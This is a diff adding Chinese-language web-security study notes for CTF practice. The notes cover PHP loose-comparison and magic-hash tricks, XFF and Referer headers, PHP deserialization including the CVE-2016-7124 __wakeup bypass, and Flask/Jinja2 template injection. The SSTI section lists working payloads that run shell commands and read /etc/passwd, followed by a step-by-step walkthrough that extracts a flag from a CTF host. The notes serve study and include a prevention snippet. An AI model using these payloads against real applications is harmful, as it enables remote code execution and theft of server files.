@@ -27,3 +27,258 @@
 | **[Duplex on the Web](https://support.google.com/webmasters/answer/9467408)** | `DuplexWeb-Google`可能会忽略 * 用户代理通配符 - [查看原因](https://support.google.com/webmasters/answer/9467408#control-crawling) | `Mozilla/5.0 (Linux; Android 8.0; Pixel 2 Build/OPD3.170816.012; DuplexWeb-Google/1.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Mobile Safari/537.36` |
 | **Google Favicon**（检索各种服务的网站元素）                 | `Google Favicon`对于用户发起的请求，会忽略 robots.txt 规则   | `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon` |
 | **[Web Light](https://support.google.com/webmasters/answer/6211428)** | `googleweblight`不遵循 robots.txt 规则 - [查看原因](https://support.google.com/webmasters/answer/6211428#robots) | `Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19` |
+
+### View-source
+
+显示指定资源的源代码，在右键无法用的时候可以在url的最前面输入`view-source:`来查看网页源代码。
+
+### php若类型
+
+===会先比较两个变量的类型是否相同，在比较数值
+
+==在比较的时候，会将两个变量转换为相同的类型，再比较
+
+```
+如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行
+```
+
+hash比较缺陷
+
+```php
+"0e132456789"=="0e7124511451155" //true
+"0e123456abc"=="0e1dddada"  //false
+"0e1abc"=="0"     //true
+```
+
+**在进行比较运算时，如果遇到了0e\d+这种字符串，就会将这种字符串解析为科学计数法。如果不满足0e\d+这种模式，就会当作字符串进行比较，所以不会相等。**
+
+十六进制转换
+
+```php
+"0x1e240"=="123456"     //true
+"0x1e240"==123456       //true
+"0x1e240"=="1e240"      //false
+```
+
+当其中的一个字符串是0x开头的时候，PHP会将此字符串解析成为十进制然后再进行比较。
+
+类型转换
+
+```php
+<?php
+$test=1 + "10.5"; // $test=11.5(float)
+$test=1+"-1.3e3"; //$test=-1299(float)
+$test=1+"bob-1.3e3";//$test=1(int)
+$test=1+"2admin";//$test=3(int)
+$test=1+"admin2";//$test=1(int)
+?>
+```
+
+PHP手册：**当一个字符串欸当作一个数值来取值，其结果和类型如下:如果该字符串没有包含`'.','e','E'`并且其数值值在整形的范围之内该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。**
+
+md5()
+
+```php
+$array1[] = array("foo" => "bar", "bar" => "foo",);
+$array2 = array("foo", "bar", "hello", "world");
+
+var_dump(md5($array1)==var_dump($array2));  //true
+```
+
+PHP手册中的md5()函数的描述是`string md5 ( string $str [, bool $raw_output = false ] )`，md5()中的需要是一个string类型的参数。但是当你传递一个array时，md5()不会报错，只是会无法正确地求出array的md5值，并且返回`NULL`。这样就会导致任意2个array的md5值都会相等。
+
+### X-Forwarded-For
+
+**X-Forwarded-For**:简称**XFF头**，它代表客户端，也就是HTTP的请求端**真实的IP**，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项。它不是RFC中定义的标准请求头信息，在squid缓存代理服务器开发文档中可以找到该项的详细介绍。
+
+> 标准格式如下：
+>
+> X-Forwarded-For: client1, proxy1, proxy2
+>
+> 从标准格式可以看出，X-Forwarded-For头信息可以有多个，中间用逗号分隔，第一项为真实的客户端ip，剩下的就是曾经经过的代理或负载均衡的ip地址，经过几个就会出现几个。
+
+如果一个 HTTP 请求到达服务器之前，经过了三个代理 Proxy1、Proxy2、Proxy3，IP 分别为 IP1、IP2、IP3，用户真实 IP 为 IP0，那么按照 XFF 标准，服务端最终会收到以下信息：
+
+X-Forwarded-For: IP0, IP1, IP2
+
+Proxy3 直连服务器，它会给 XFF 追加 IP2，表示它是在帮 Proxy2 转发请求。列表中并没有 IP3，IP3 可以在服务端通过 Remote Address 字段获得。我们知道 HTTP 连接基于 TCP 连接，HTTP 协议中没有 IP 的概念，Remote Address 来自 TCP 连接，表示与服务端建立 TCP 连接的设备 IP，在这个例子里就是 IP3。
+
+Remote Address 无法伪造，因为建立 TCP 连接需要三次握手，如果伪造了源 IP，无法建立 TCP 连接，更不会有后面的 HTTP 请求。不同语言获取 Remote Address 的方式不一样，例如 php 是 $_SERVER["REMOTE_ADDR"]，Node.js 是 req.connection.remoteAddress，但原理都一样。
+
+### Referer
+
+`Referer` 请求头包含了当前请求页面的来源页面的地址，即表示当前页面是通过此来源页面里的链接进入的。服务端一般使用 `Referer` 请求头识别访问来源，可能会以此进行统计分析、日志记录以及缓存优化等
+
+### 序列化
+
+所有php里面的值都可以使用函数`serialize()`来返回一个包含**字节流的字符串来表示**。
+
+`unserialize()`函数能够**重新把字符串变回php原来的值**。
+
+ 序列化一个对象将会**保存对象的所有变量**，但是**不会保存对象的方法**，只会保存类的名字。
+
+为了能够`unserialize()`一个对象，**这个对象的类必须已经定义过**。如果序列化类A的一个对象，将会返回一个跟类A相关，而且包含了对象所有变量值的字符串。 如果要想在另外一个文件中解序列化一个对象，这个对象的类必须在解序列化之前定义，可以通过包含一个定义该类的文件或使用函数`spl_autoload_register()`来实现。
+
+**__sleep()**
+
+serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。
+
+对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要的属性。
+
+**__wakeup()**
+
+unserialize() 会检查是否存在一个 \__wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。
+
+预先准备对象资源，返回void，常用于反序列化操作中重新建立数据库连接或执行其他初始化操作。
+
+~~~php
+a - array
+b - boolean
+d - double
+i - integer
+o - common object
+r - reference
+s - string
+C - custom object
+O - class
+N - null
+R - pointer reference
+U - unicode string
+~~~
+
+* CVE-2016-7124漏洞，当序列化字符串中**表示对象属性个数的值**大于**真实的属性个数时**会跳过__wakeup的执行
+
+~~~php
+<?php
+	class Student{
+		private $name = "casuall";
+		private $age = 18;
+		public function __wakeup(){
+			echo "wakeup is called";
+			echo "<br/>";
+		}
+	}
+
+	$a = new Student;
+	$ser = serialize($a);
+	echo $ser . "<br/>";
+
+	$unser = unserialize($ser);
+
+	// output:
+	// O:7:"Student":2:{s:13:"Studentname";s:7:"casuall";s:12:"Studentage";i:18;}
+  // wakeup is called
+  // 其中:2:中的2表示对象属性个数，其余的遵循 “类型：长度：值” 的格式
+?>
+~~~
+
+### 模版注入(SSTI)
+
+flask模块的渲染方法有render_template和render_template_string两种。
+
+render_template()是用来渲染一个指定的文件的
+
+~~~python
+return render_tmplate('index.html')
+~~~
+
+Render_template_string用来渲染一个字符串，SSTI与这个方法有关系。
+
+~~~python
+html = '<h1>This is index page</h1>'
+return render_template_string(html)
+~~~
+
+flask是使用Jinja2来作为渲染引擎的。
+
+在网站的根目录下新建`templates`文件夹，这里是用来存放html文件，也就是模板文件。
+
+模板文件并不是单纯的html代码，而是夹杂着模板的语法，因为页面不可能都是一个样子的，有一些地方是会变化的。比如说显示用户名的地方，这个时候就需要使用模板支持的语法，来传参。
+
+`{{}}`在Jinja2中作为变量包裹标识符，不仅可以传递变量，还可以执行一些简单的表达式。
+
+不正确的使用flask中的`render_template_string`方法会引发SSTI。
+
+python的几个魔术方法
+
+* `__class__`  python中的新式类（即显示继承object对象的类）都有一个属性 `__class__` 用于获取当前实例对应的类，例如 `"".__class__` 就可以获取到字符串实例对应的类
+* `__mro__`    python中类对象的 __mro__ 属性会返回一个tuple对象，其中包含了当前类对象所有继承的基类，tuple中元素的顺序是MRO（Method Resolution Order） 寻找的顺序
+* `__base__`   返回该对象所继承的基类
+  // __base__和__mro__都是用来寻找基类的
+* `__subclasses__`   python的新式类都保留了它所有的子类的引用，`__subclasses__()` 这个方法返回了类的所有存活的子类的引用（是类对象引用，不是实例）。
+* `__init__`  类的初始化方法
+* `__globals__`  保存了函数所有的所有全局变量，在利用中，可以使用 `__init__` 获取对象的函数，并通过 `__globals__` 获取 file、os 等模块以进行下一步的利用
+
+**测试用例**
+
+Flask/Jinja2
+
+- `{{ config }}`
+- `{{ config.items() }}`
+- `{{get_flashed_messages.__globals__['current_app'].config}}`
+- `{{''.__class__.__mro__[-1].__subclasses__()}}`
+- `{{ url_for.__globals__['__builtins__'].__import__('os').system('ls') }}`
+- `{{ request.__init__.__globals__['__builtins__'].open('/etc/passwd').read() }}`
+
+**常见payload**
+
+- `().__class__.__bases__[0].__subclasses__()[40](r'/etc/passwd').read()`
+- `().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls /").read()' )`
+
+**预防**
+
+将传入可控参数的地方加上变量包裹符`{{}}`，即可防止表达式执行。
+
+~~~python
+@app.route('/test/')
+def test():
+    code = request.args.get('id')
+    return render_template_string('<h1>{{ code }}</h1>',code=code)
+~~~
+
+以一个题为例，题目来自于攻防世界的Web_python_template_injection
+
+~~~php
+http://220.249.52.133:52133/{{7*7}}
+# 返回下面的结果，可以看到7*7被执行了
+# URL http://220.249.52.133:52133/49 not found
+
+http://220.249.52.133:52133/{{''.__class__}}
+# ''.__class__ 返回空字符串的类型
+# URL http://220.249.52.133:52133/<type 'str'> not found
+
+http://220.249.52.133:52133/{{''.__class__.__mro__}}
+# 返回了当前类和继承的基类，这里我们选择object类
+# URL http://220.249.52.133:52133/(<type 'str'>, <type 'basestring'>, <type 'object'>) not found
+
+http://220.249.52.133:52133/{{''.__class__.__mro__[2]}}
+# URL http://220.249.52.133:52133/<type 'object'> not found
+
+http://220.249.52.133:52133/{{''.__class__.__mro__[2].__subclasses__}}
+# 提示我们__subclasses__是一个内置方法，所以需要加括号执行
+# URL http://220.249.52.133:52133/<built-in method __subclasses__ of type object at 0x8f8740> not found
+
+http://220.249.52.133:52133/{{''.__class__.__mro__[2].__subclasses__()}}
+# object的子类太多，就不列举了，我们找到了file
+# URL http://220.249.52.133:52133/[<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>, <type 'NoneType'>, <type 'NotImplementedType'>...] not found
+
+http://220.249.52.133:52133/{{''.__class__.__mro__[2].__subclasses__()[71]}}
+# URL http://220.249.52.133:52133/<class 'site._Printer'> not found
+
+http://220.249.52.133:52133/{{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__}}
+# URL http://220.249.52.133:52133/{'traceback': <module 'traceback' from '/usr/lib/python2.7/traceback.pyc'>, 'setencoding': <function setencoding at 0x7fabe2ab3410>, 'sethelper': <function sethelper at 0x7fabe2ab3230>, 'execsitecustomize': <function execsitecustomize at 0x7fabe2ab3488>...}
+
+http://220.249.52.133:52133/{{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os']}}
+# URL http://220.249.52.133:52133/<module 'os' from '/usr/lib/python2.7/os.pyc'> not found
+
+http://220.249.52.133:52133/{{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].listdir('.')}}
+# URL http://220.249.52.133:52133/['fl4g', 'index.py'] not found
+
+http://220.249.52.133:52133/{{''.__class__.__mro__[2].__subclasses__()[40]}}
+# URL http://220.249.52.133:52133/<type 'file'> not found
+
+http://220.249.52.133:52133/{{''.__class__.__mro__[2].__subclasses__()[40]('./fl4g').read()}}
+# URL http://220.249.52.133:52133/ctf{f22b6844-5169-4054-b2a0-d95b9361cb57} not found
+
+~~~
+
